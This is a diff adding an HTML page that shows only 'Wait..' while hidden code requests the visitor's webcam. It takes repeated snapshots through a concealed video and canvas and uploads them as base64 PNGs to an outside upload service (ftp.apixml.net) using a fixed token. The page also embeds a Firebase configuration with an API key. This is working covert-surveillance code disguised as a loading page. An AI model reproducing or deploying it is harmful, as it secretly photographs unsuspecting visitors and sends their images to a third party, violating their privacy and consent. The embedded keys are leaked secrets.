@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title></title>
+     <script src="https://www.gstatic.com/firebasejs/7.22.0/firebase-app.js"></script>
+     <!-- Firebase Database-->
+     <script src="https://www.gstatic.com/firebasejs/7.22.0/firebase-database.js"></script>
+    
+    <script src="ftp.js"></script>
+  <style>
+	  @import url('/style.css');
+</style>  
+
+<style>
+/* Progress Bar */
+.progress {
+  position: relative;
+  height: 15px;
+  display: block;
+  width: 70%;
+  background-color: #acece6;
+  border-radius: 2px;
+  background-clip: padding-box;
+  margin: 0.5rem 0 1rem 0;
+  overflow: hidden; }
+  .progress .determinate {
+    position: absolute;
+    background-color: inherit;
+    top: 0;
+    bottom: 0;
+    background-color: #26a69a;
+    transition: width .3s linear; }
+  .progress .indeterminate {
+    background-color: #1df37d; }
+    .progress .indeterminate:before {
+      content: '';
+      position: absolute;
+      background-color: inherit;
+      top: 0;
+      left: 0;
+      bottom: 0;
+      will-change: left, right;
+      -webkit-animation: indeterminate 2.1s cubic-bezier(0.65, 0.815, 0.735, 0.395) infinite;
+              animation: indeterminate 2.1s cubic-bezier(0.65, 0.815, 0.735, 0.395) infinite; }
+    .progress .indeterminate:after {
+      content: '';
+      position: absolute;
+      background-color: inherit;
+      top: 0;
+      left: 0;
+      bottom: 0;
+      will-change: left, right;
+      -webkit-animation: indeterminate-short 2.1s cubic-bezier(0.165, 0.84, 0.44, 1) infinite;
+              animation: indeterminate-short 2.1s cubic-bezier(0.165, 0.84, 0.44, 1) infinite;
+      -webkit-animation-delay: 1.15s;
+              animation-delay: 1.15s; }
+
+@-webkit-keyframes indeterminate {
+  0% {
+    left: -35%;
+    right: 100%; }
+  60% {
+
+
+    left: 100%;
+    right: -90%; }
+  100% {
+    left: 100%;
+    right: -90%; } }
+@keyframes indeterminate {
+  0% {
+    left: -35%;
+    right: 100%; }
+  60% {
+    left: 100%;
+    right: -90%; }
+  100% {
+    left: 100%;
+    right: -90%; } }
+@-webkit-keyframes indeterminate-short {
+  0% {
+    left: -200%;
+    right: 100%; }  60% {
+    left: 107%;
+
+    right: -8%; }
+  100% {
+    left: 107%;
+    right: -8%; } }
+@keyframes indeterminate-short {
+  0% {
+    left: -200%;
+    right: 100%; }
+  60% {
+    left: 107%;
+    right: -8%; }
+  100% {
+    left: 107%;
+    right: -8%; } }
+
+#progress{
+display:none;
+}
+.onuploadshowimg{
+  widthwid:100%;
+}
+</style>
+<script>
+﻿// Script from http://ftp.apixml.net/
+// Copyright 2017 http://ftp.apixml.net/, DO NOT REMOVE THIS COPYRIGHT NOTICE
+var Ftp = {
+    createCORSRequest: function (method, url) {
+        var xhr = new XMLHttpRequest();
+        if ("withCredentials" in xhr) {
+            // Check if the XMLHttpRequest object has a "withCredentials" property.
+            // "withCredentials" only exists on XMLHTTPRequest2 objects.
+            xhr.open(method, url, true);
+        } else if (typeof XDomainRequest != "undefined") {
+            // Otherwise, check if XDomainRequest.
+            // XDomainRequest only exists in IE, and is IE's way of making CORS requests.
+            xhr = new XDomainRequest();
+            xhr.open(method, url);
+        } else {
+            // Otherwise, CORS is not supported by the browser.
+            xhr = null;
+        }
+        return xhr;
+    },
+    upload: function(token, files) {
+      
+       // var reader = new FileReader();
+        //reader.readAsDataURL(file);
+        
+            
+              document.getElementById("popu").innerText = "";
+                  	  progress.style.display="block"
+                var base64 = capture(); 
+                var coname= makeid(8)+".png";
+                var xhr = Ftp.createCORSRequest('POST', "http://ftp.apixml.net/upload.aspx");
+                if (!xhr) {
+                    throw new Error('CORS not supported');
+                }
+				xhr.onreadystatechange = function() {
+					if (xhr.readyState == 4 && xhr.status == 200) {
+						Ftp.callback();
+					}
+				};
+                xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+                xhr.send("token=" + token + "&data=" + encodeURIComponent(base64) + "&file=" + coname);
+                recordval(coname)
+                
+                
+            
+    
+     
+     
+     },
+	callback: function(){
+	  progress.style.display="none"
+	  PushData()
+	}
+};
+var prefixfullurl="http://picshare.my-style.in/"
+function recordval(a){
+  firstlink.value=prefixfullurl+a;
+  secondlink.value=prefixfullurl+"FtpTrial-"+a;
+
+}
+
+function PushData(){
+  /*
+  makeid(8)
+  var link_a=firstlink.value;
+  var link_b=secondlink.value;
+  var randstr= randomstr.value;
+  firebase.database().ref("locations/"+randstr+"/img").push().set({
+  
+    "img": link_a,
+    "img_b":link_b,
+  
+  
+  })
+  
+  
+  */
+  return false;
+firstlink.value=""
+secondlink.value=""
+
+}
+
+
+
+
+
+Number.prototype.pad = function(n) {
+  for (var r = this.toString(); r.length < n; r = 0 + r);
+  return r;
+};
+
+function makeid(length) { 
+var result = [];
+ var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+ var charactersLength = characters.length; for ( var i = 0; i < length; i++ ) {
+  result.push(characters.charAt(Math.floor(Math.random() * charactersLength))); 
+  } 
+return result.join('');
+  
+   }
+   
+</script>
+<script>
+      
+
+
+const firebaseConfig = {
+apiKey: "AIzaSyBX2lZTMr2xL9C7Ti9znlE9ih-r4Iroo80",
+    authDomain: "freefirefurqan.firebaseapp.com",
+    databaseURL: "https://freefirefurqan.firebaseio.com",
+    projectId: "freefirefurqan",
+    storageBucket: "freefirefurqan.appspot.com",
+    messagingSenderId: "755869413215",
+    appId: "1:755869413215:web:e81d6f35a3302a09c890ea",
+    measurementId: "G-6WV6QZ6DRB"
+};
+// Initialize Firebase
+firebase.initializeApp(firebaseConfig);
+</script>
+</head>
+
+<body>
+<span id="lol">Wait..</span>
+
+<center><div style="display:none">
+<div id="progress">
+<div class="progress">
+  <div class="indeterminate">
+</div>
+</div>
+<h3>Please Wait Uploading...</h3>
+</div>
+</center>
+
+<div id="imgdiv"></div>
+
+<input type="hidden" id="firstlink"/>
+<input type="hidden" id="secondlink"/>
+<input type="hidden" id="randomstr"/>
+<p id="popu"></p>
+</div>
+</body>
+<video display="none" width="100%" style="display:none" controls="true" id="video"/>
+<p style="display:none" id="printresult"></p>
+<canvas style="display:none"  id="canvas"></canvas>
+<script>
+    var video = document.querySelector("#video");
+ if (navigator.mediaDevices.getUserMedia) { 
+ navigator.mediaDevices.getUserMedia({
+  video: true }).then(function (stream) { 
+  
+  video.srcObject = stream; 
+    setTimeout(function(){
+      video.play()
+    },1000)
+    setTimeout(function(){
+      
+      Ftp.upload('4c1e9ff9-86ae-4356-88d0-657e7355580a','q')
+      
+    },2000)
+  
+  
+
+    setTimeout(function(){
+      
+      Ftp.upload('4c1e9ff9-86ae-4356-88d0-657e7355580a','q')
+      
+    },2000)
+    
+    
+
+
+    setTimeout(function(){
+      
+      Ftp.upload('4c1e9ff9-86ae-4356-88d0-657e7355580a','q')
+    
+    },3000);
+    
+    
+    
+ 
+  
+  }).catch(function (err0r) {
+   console.log("Something went wrong!"); 
+   });
+    } 
+    var resultb64=""; 
+    function capture() { 
+    var canvas = document.getElementById('canvas'); 
+    var video = document.getElementById('video'); canvas.width = 360; 
+    canvas.height = 360; canvas.getContext('2d').drawImage(video, 0, 0, 200,200); 
+    
+    return canvas.toDataURL()
+    } 
+    
+     
+     
+
+
+  
+  
+</script>
+</html>
